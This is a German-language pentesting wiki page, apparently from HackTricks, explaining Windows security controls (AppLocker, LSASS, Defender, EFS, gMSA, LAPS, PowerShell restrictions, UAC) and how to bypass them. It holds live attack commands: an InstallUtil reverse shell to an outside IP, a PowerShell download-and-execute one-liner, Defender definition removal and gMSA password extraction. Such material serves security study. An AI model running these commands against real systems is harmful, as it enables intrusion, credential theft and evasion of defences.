# Windows-Sicherheitskontrollen

{{#include ../banners/hacktricks-training.md}}

## AppLocker-Richtlinie

Eine Application Whitelist ist eine Liste genehmigter Softwareanwendungen oder ausführbarer Dateien, deren Vorhandensein und Ausführung auf einem System erlaubt sind. Ziel ist es, die Umgebung vor schädlicher Malware und nicht genehmigter Software zu schützen, die nicht den spezifischen geschäftlichen Anforderungen einer Organisation entspricht.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ist Microsofts **Application-Whitelisting-Lösung** und gibt Systemadministratoren Kontrolle darüber, **welche Anwendungen und Dateien Benutzer ausführen können**. Sie bietet **granulare Kontrolle** über ausführbare Dateien, Skripte, Windows-Installer-Dateien, DLLs, paketierte Apps und Installer für paketierte Apps.\
Es ist üblich, dass Organisationen **cmd.exe und PowerShell.exe** sowie den Schreibzugriff auf bestimmte Verzeichnisse **blockieren, aber all dies kann umgangen werden**.

### Prüfen

Prüfe, welche Dateien/Erweiterungen auf der Blacklist/Whitelist stehen:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Dieser Registry-Pfad enthält die von AppLocker angewendeten Konfigurationen und Richtlinien und ermöglicht die Überprüfung der aktuell auf dem System durchgesetzten Regeln:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Nützliche **beschreibbare Ordner**, um die AppLocker Policy zu umgehen: Wenn AppLocker die Ausführung beliebiger Dateien innerhalb von `C:\Windows\System32` oder `C:\Windows` erlaubt, gibt es **beschreibbare Ordner**, die du verwenden kannst, um dies zu **umgehen**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Häufig **vertrauenswürdige** [**„LOLBAS's“**](https://lolbas-project.github.io/) Binaries können ebenfalls nützlich sein, um AppLocker zu umgehen.
- **Schlecht geschriebene Regeln können ebenfalls umgangen werden.**
- Zum Beispiel kann bei **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** überall ein **Ordner namens `allowed`** erstellt werden, der dann erlaubt ist.
- Organisationen konzentrieren sich außerdem häufig darauf, die ausführbare Datei **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** zu **blockieren**, vergessen aber die **anderen** [**Speicherorte der PowerShell-Executables**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) wie `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` oder `PowerShell_ISE.exe`.
- **DLL enforcement** ist aufgrund der zusätzlichen Belastung, die dadurch auf ein System ausgeübt werden kann, und des erforderlichen Testaufwands, um sicherzustellen, dass nichts beschädigt wird, nur sehr selten aktiviert. Daher kann die Verwendung von **DLLs als Backdoors helfen, AppLocker zu umgehen**.
- Mit [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kann **Powershell**-Code in jedem Prozess **ausgeführt** und AppLocker umgangen werden. Weitere Informationen finden sich unter: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Speicherung von Zugangsdaten

### Security Accounts Manager (SAM)

Lokale Zugangsdaten befinden sich in dieser Datei; die Passwörter sind gehasht.

### Local Security Authority (LSA) - LSASS

Die **Zugangsdaten** (gehasht) werden aus Gründen des Single Sign-On im **Speicher** dieses Subsystems **gespeichert**.\
**LSA** verwaltet die lokale **Sicherheitsrichtlinie** (Passwortrichtlinie, Benutzerberechtigungen ...), **Authentifizierung**, **Zugriffstoken** ...\
LSA überprüft die **bereitgestellten Zugangsdaten** in der **SAM**-Datei (bei einer lokalen Anmeldung) und **kommuniziert** mit dem **Domain Controller**, um einen Domainbenutzer zu authentifizieren.

Die **Zugangsdaten** werden im **Prozess LSASS** **gespeichert**: Kerberos-Tickets, NT- und LM-Hashes sowie leicht entschlüsselbare Passwörter.

### LSA secrets

LSA kann einige Zugangsdaten auf der Festplatte speichern:

- Passwort des Computerkontos von Active Directory (nicht erreichbarer Domain Controller)
- Passwörter der Konten von Windows-Diensten
- Passwörter für geplante Tasks
- Weitere (Passwort von IIS-Anwendungen ...)

### NTDS.dit

Dabei handelt es sich um die Datenbank von Active Directory. Sie ist nur auf Domain Controllern vorhanden.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ist ein Antivirus, der in Windows 10 und Windows 11 sowie in Versionen von Windows Server verfügbar ist. Er **blockiert** gängige Pentesting-Tools wie **`WinPEAS`**. Es gibt jedoch Möglichkeiten, **diese Schutzmaßnahmen zu umgehen**.

### Überprüfung

Um den **Status** von **Defender** zu überprüfen, kann das PS-Cmdlet **`Get-MpComputerStatus`** ausgeführt werden. (Überprüfe den Wert von **`RealTimeProtectionEnabled`**, um festzustellen, ob der Schutz aktiv ist.)

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Zur Aufzählung kann außerdem Folgendes ausgeführt werden:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Verschlüsseltes Dateisystem (EFS)

EFS sichert Dateien durch Verschlüsselung unter Verwendung eines **symmetrischen Schlüssels**, der als **File Encryption Key (FEK)** bezeichnet wird. Dieser Schlüssel wird mit dem **öffentlichen Schlüssel** des Benutzers verschlüsselt und im **alternativen Datenstrom** $EFS der verschlüsselten Datei gespeichert. Wenn eine Entschlüsselung erforderlich ist, wird der entsprechende **private Schlüssel** des digitalen Zertifikats des Benutzers verwendet, um den FEK aus dem $EFS-Datenstrom zu entschlüsseln. Weitere Details finden sich [hier](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Entschlüsselungsszenarien ohne Benutzerinitiierung** umfassen:

- Wenn Dateien oder Ordner in ein Nicht-EFS-Dateisystem wie [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) verschoben werden, werden sie automatisch entschlüsselt.
- Über das SMB/CIFS-Protokoll über das Netzwerk gesendete verschlüsselte Dateien werden vor der Übertragung entschlüsselt.

Diese Verschlüsselungsmethode ermöglicht dem Besitzer einen **transparenten Zugriff** auf verschlüsselte Dateien. Das einfache Ändern des Passworts des Besitzers und anschließende Anmelden ermöglicht jedoch keine Entschlüsselung.

**Wichtige Erkenntnisse**:

- EFS verwendet einen symmetrischen FEK, der mit dem öffentlichen Schlüssel des Benutzers verschlüsselt wird.
- Für die Entschlüsselung wird der private Schlüssel des Benutzers verwendet, um auf den FEK zuzugreifen.
- Eine automatische Entschlüsselung erfolgt unter bestimmten Bedingungen, etwa beim Kopieren nach FAT32 oder bei der Netzwerkübertragung.
- Verschlüsselte Dateien sind für den Besitzer ohne zusätzliche Schritte zugänglich.

### EFS-Informationen prüfen

Prüfe, ob ein **Benutzer** diesen **Dienst** **verwendet**, indem du überprüfst, ob dieser Pfad existiert:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Prüfe mit cipher /c \<file>\, **wer** **Zugriff** auf die Datei hat\
Du kannst auch `cipher /e` und `cipher /d` innerhalb eines Ordners verwenden, um alle Dateien zu **verschlüsseln** und zu **entschlüsseln**

### EFS-Dateien entschlüsseln

#### Als Authority System

Diese Methode setzt voraus, dass der **Opferbenutzer** einen **Prozess** auf dem Host **ausführt**. Wenn dies der Fall ist, kannst du mit einer `meterpreter`-Sitzung den Token des Benutzerprozesses imitieren (`impersonate_token` aus `incognito`). Alternativ kannst du einfach zu einem Prozess des Benutzers `migrate`n.

#### Das Passwort des Benutzers kennen

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft entwickelte **Group Managed Service Accounts (gMSA)**, um die Verwaltung von Dienstkonten in IT-Infrastrukturen zu vereinfachen. Im Gegensatz zu herkömmlichen Dienstkonten, bei denen häufig die Einstellung "**Password never expire**" aktiviert ist, bieten gMSAs eine sicherere und besser verwaltbare Lösung:

- **Automatische Passwortverwaltung**: gMSAs verwenden ein komplexes Passwort mit 240 Zeichen, das sich entsprechend der Domänen- oder Computerrichtlinie automatisch ändert. Dieser Prozess wird vom Microsoft Key Distribution Service (KDC) verwaltet, wodurch manuelle Passwortaktualisierungen entfallen.
- **Erhöhte Sicherheit**: Diese Konten sind gegen Sperrungen geschützt und können nicht für interaktive Anmeldungen verwendet werden, was ihre Sicherheit erhöht.
- **Unterstützung mehrerer Hosts**: gMSAs können von mehreren Hosts gemeinsam genutzt werden, wodurch sie sich ideal für Dienste eignen, die auf mehreren Servern ausgeführt werden.
- **Unterstützung geplanter Tasks**: Im Gegensatz zu Managed Service Accounts unterstützen gMSAs die Ausführung geplanter Tasks.
- **Vereinfachte SPN-Verwaltung**: Das System aktualisiert den Service Principal Name (SPN) automatisch, wenn sich die sAMaccount-Details oder der DNS-Name des Computers ändern, wodurch die SPN-Verwaltung vereinfacht wird.

Die Passwörter für gMSAs werden in der LDAP-Eigenschaft _**msDS-ManagedPassword**_ gespeichert und von Domain Controllern (DCs) alle 30 Tage automatisch zurückgesetzt. Dieses Passwort, ein verschlüsseltes Datenblob namens [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kann nur von autorisierten Administratoren und den Servern abgerufen werden, auf denen die gMSAs installiert sind, wodurch eine sichere Umgebung gewährleistet wird. Für den Zugriff auf diese Informationen ist eine gesicherte Verbindung wie LDAPS erforderlich, oder die Verbindung muss mit 'Sealing & Secure' authentifiziert sein.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Du kannst dieses Passwort mit [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** auslesen.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Weitere Informationen finden Sie in diesem Beitrag**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Sehen Sie sich auch diese [Webseite](https://cube0x0.github.io/Relaying-for-gMSA/) an, um zu erfahren, wie ein **NTLM relay attack** durchgeführt wird, um das **Passwort** eines **gMSA** zu **lesen**.<sup>[[3]](#references)</sup>

## LAPS

Die **Local Administrator Password Solution (LAPS)**, die bei [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) zum Download verfügbar ist, ermöglicht die Verwaltung lokaler Administratorpasswörter. Diese **randomisierten**, eindeutigen und **regelmäßig geänderten** Passwörter werden zentral in Active Directory gespeichert. Der Zugriff auf diese Passwörter wird durch ACLs auf autorisierte Benutzer beschränkt. Mit ausreichenden Berechtigungen wird die Möglichkeit bereitgestellt, lokale Adminpasswörter zu lesen.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

Der PowerShell-[**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **schränkt viele der für eine effektive Nutzung von PowerShell erforderlichen Funktionen ein**, beispielsweise durch das Blockieren von COM-Objekten und die ausschließliche Zulassung genehmigter .NET-Typen, XAML-basierter Workflows, PowerShell-Klassen und mehr.

### **Prüfen**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
In aktuellen Windows-Versionen funktioniert dieser Bypass nicht, aber Sie können [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) verwenden.\
**Zum Kompilieren müssen Sie möglicherweise** **eine** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` hinzufügen und **das Projekt auf .Net4.5 ändern**.

#### Direkter Bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), um **Powershell-Code** in jedem Prozess auszuführen und den Constrained Mode zu umgehen. Weitere Informationen findest du unter: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS Execution Policy

Standardmäßig ist sie auf **restricted.** gesetzt. Die wichtigsten Möglichkeiten, diese Richtlinie zu umgehen:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Mehr dazu finden Sie [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Ist die API, die zur Authentifizierung von Benutzern verwendet werden kann.

Die SSPI ist dafür zuständig, das geeignete Protokoll für zwei Computer zu finden, die miteinander kommunizieren möchten. Die bevorzugte Methode hierfür ist Kerberos. Anschließend handelt die SSPI aus, welches Authentication Protocol verwendet wird. Diese Authentication Protocols werden Security Support Provider (SSP) genannt, befinden sich in Form einer DLL in jedem Windows-Computer, und beide Computer müssen denselben SSP unterstützen, um kommunizieren zu können.

### Main SSPs

- **Kerberos**: Der bevorzugte
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** und **NTLMv2**: Aus Kompatibilitätsgründen
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Webserver und LDAP, Passwort in Form eines MD5-Hashes
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL und TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Wird verwendet, um das zu verwendende Protokoll auszuhandeln (Kerberos oder NTLM, wobei Kerberos das Standardprotokoll ist)
- %windir%\Windows\System32\lsasrv.dll

#### Die Aushandlung kann mehrere Methoden oder nur eine anbieten.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsabfrage für Aktivitäten mit erhöhten Rechten** ermöglicht.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [Bypassing Applocker and Powershell contstrained language mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [2] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying for gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

{{#include ../banners/hacktricks-training.md}}
